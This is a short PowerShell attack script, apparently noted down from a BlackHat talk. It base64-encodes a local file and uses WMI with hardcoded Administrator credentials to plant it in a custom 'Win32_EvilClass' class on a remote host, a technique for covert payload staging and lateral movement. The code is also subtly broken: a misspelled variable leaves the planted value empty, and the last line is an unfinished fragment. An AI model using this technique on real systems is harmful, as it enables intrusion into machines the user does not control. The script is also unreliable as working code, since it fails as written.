# From BlackHat video, something, no link =`(

$Localfilepath = "path"
$FileBytes = [IO.File]::ReadAllBytes($Localfilepath)
$EncodeFileContentsToDrop = [Convert]::ToBase64String($FileBytes)

$Options = New-Object Management.ConnectionOptions
$Options | % { 

    $_.Username = "Administrator"
    $_.Password = "user"
    $_.EnablePrivileges = $True
}

$Connection = New-Object Management.ManagementScope
$Connection | % { 

    $_.Path = "\\192.168.72.134\root\default"
    $_.Options = $Options
    $_.Connect()
}

$EvilClass = New-Object Management.ManagementClass($Connection,[String]::Empty,$Null)
$EvilClass | % { 

    $_["__CLASS"] = "Win32_EvilClass"
    $_.Properties.Add("EvilProperty",[Management.CimType]::String,$False)
    $_.Properties["EvilProperty"].Value = $EncodedFileContentsToDrop
    $_.Put()
}

$Credential = Get-Credential
$CommonArgs = @{ 

    Credential = $Credential
    ComputerName = "192.168.72.134"
}

[Powershell].Assembly.GetType("System.Management.Automation.TypeAccelerators").Add("")#
